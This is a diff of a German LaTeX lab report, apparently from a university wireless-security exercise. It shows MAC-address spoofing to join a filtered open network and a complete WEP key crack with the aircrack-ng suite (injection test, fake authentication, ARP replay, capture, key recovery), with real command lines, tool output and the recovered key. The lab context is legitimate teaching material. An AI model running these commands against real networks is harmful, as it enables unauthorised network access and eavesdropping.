@@ -30,18 +30,56 @@ Die Daten zeigen, dass SecureBernd im WPA2 Modus betrieben wird, Bernd mittels W
 
 \subsection{Angriff auf OpenBernd}
 
+Mittels \texttt{airodump-ng -w output mon8} beobachteten wir den WLAN Netzwerkverkehr. Das Interface \texttt{mon8} war das Zugangsinterface zum Interface \texttt{wlan1} im Monitormode. Die folgende Zeile fiel aus dabei auf. Ein Gerät mit der MAC Adresse \texttt{00:C0:CA:55:54:5C} hat sich versucht am Netzwerk \texttt{OpenBernd} anzumelden.
+\begin{small}
+\begin{verbatim}
+Station MAC, First time seen, Last time seen, Power, # packets, BSSID, Probed ESSIDs
+....
+00:C0:CA:55:54:5C, 2013-11-11 16:39:42, 2013-11-11 16:39:42, -61,        1, 64:70:02:1C:4F:3A, OpenBernd
+...
+\end{verbatim}
+\end{small}
+Nach dem wir mittels \texttt{ip link set dev wlan1 address 00:C0:CA:55:54:5C} die MAC Adresse unseres Interface \texttt{wlan1} geändert hatten, konnten wir uns mit dem Netz \texttt{OpenBernd} verbinden.
+
 \subsection{Angriff auf Bernd}
 
-Als erstes haben wir mit dem Kommando \texttt{aireplay-ng --test -e Bernd -a 64:70:02:1A:B1:81 --ignore-negative-one wlan1} überprüft, ob wir in das Netzwerk Bernd Packete injizieren können.
-Da unser Client nicht am Access Point authentifiziert ist, führen wir mittels \texttt{aireplay-ng  -1 0 -e Bernd -a 64:70:02:1A:B1:81 -h 00:C0:CA:55:54:5F --ignore-negative-one wlan1} eine Fakeauthentifizierung durch.
 
-IVs mitschneiden: \texttt{airodump-ng -c 2 --bssid 64:70:02:1A:B1:81 -w output wlan1}
+Als erstes haben wir mit dem folgenden Kommando überprüft, ob wir in das Netzwerk Bernd Packete injizieren können.
+\begin{verbatim}
+aireplay-ng --test -e Bernd -a 64:70:02:1A:B1:81 --ignore-negative-one wlan1
+\end{verbatim}
+Da unser Client nicht am Access Point authentifiziert ist, führen wir mittels eine Fakeauthentifizierung durch.
+\begin{verbatim}
+aireplay-ng  -1 0 -e Bernd -a 64:70:02:1A:B1:81 -h 00:C0:CA:55:54:5F --ignore-negative-one wlan1
+\end{verbatim}
+Dannach schnitten wir alle Packete im Netzwerk mit:
+\begin{verbatim}
+airodump-ng -c 2 --bssid 64:70:02:1A:B1:81 -w output wlan1
+\end{verbatim}
 
-ARP Replay:  \texttt{aireplay-ng -3 -b 64:70:02:1A:B1:81 -h 00:C0:CA:55:54:5F wlan1}
+Um die Menge an beobachteten Packeten zu erhöhen fuhren wir eine ARP Replayattacke. Dabei wird jedes abgefangene Packet wieder in das Netzwerk eingespielt.
+\begin{verbatim}
+aireplay-ng -3 -b 64:70:02:1A:B1:81 -h 00:C0:CA:55:54:5F wlan1
+\end{verbatim}
+Nach circa 10 Minuten Packete mitschneiden knackten wir auf Basis der mitgeschnittenen Packete den WEP PreSharedKey:
+\begin{verbatim}
+aircrack-ng -b 64:70:02:1A:B1:81 output*.cap
+\end{verbatim}
+\begin{tiny}
+\begin{verbatim}
+                                                                 [00:00:00] Tested 835 keys (got 93526 IVs)
 
-Aus den Abgefangen Packeten den IV berechnen: \texttt{aircrack-ng -b 64:70:02:1A:B1:81 output*.cap}
+   KB    depth   byte(vote)
+    0    0/ 25   71(122112) F5(107008) 3B(105216) 1B(103680) 94(103424) 90(103168) 3A(102656) A6(102656) 59(102400) CA(102400) 45(102144) 8B(101376) 9B(101120) 56(100864) 
+    1    1/  1   E6(108288) 64(106496) 48(105472) 08(104960) 93(103936) 16(103424) 6B(103168) 92(102912) AA(102912) 74(102656) 56(102400) D9(102400) 9A(102144) 9F(102144) 
+    2    0/  1   F9(131328) EF(108288) D0(107264) DF(107264) D2(105984) D9(105216) 02(104448) 7C(103936) E2(103168) 12(102912) C6(102912) 1A(102144) AB(102144) EA(102144) 
+    3    0/  1   47(136960) 35(107776) 6B(106240) 74(106240) A2(106240) 08(105984) 70(104960) A3(104192) BE(103168) 22(102656) 31(102656) 87(102656) A8(102656) E8(102656) 
+    4   14/  4   50(102144) 93(101632) 40(101120) B5(100864) 17(100608) 44(100608) 5B(100352) 75(100352) 18(100096) A3(100096) 55(99584) E3(99584) 26(99328) 65(99328) 
 
-
-TODO: Link entfernen: 
+     KEY FOUND! [ 71:32:56:4E:4B:7A:31:47:73:52:71:59:41 ] (ASCII: q2VNKz1GsRqYA )
+	Decrypted correctly: 100%
+\end{verbatim}
+\end{tiny}
+Der verwendete WEP Key im Netzwerk Bernd lautet also: \texttt{q2VNKz1GsRqYA}.
 %http://www.aircrack-ng.org/doku.php?id=simple_wep_crack#step_1_-_start_the_wireless_interface_in_monitor_mode_on_ap_channel
 \end{document}
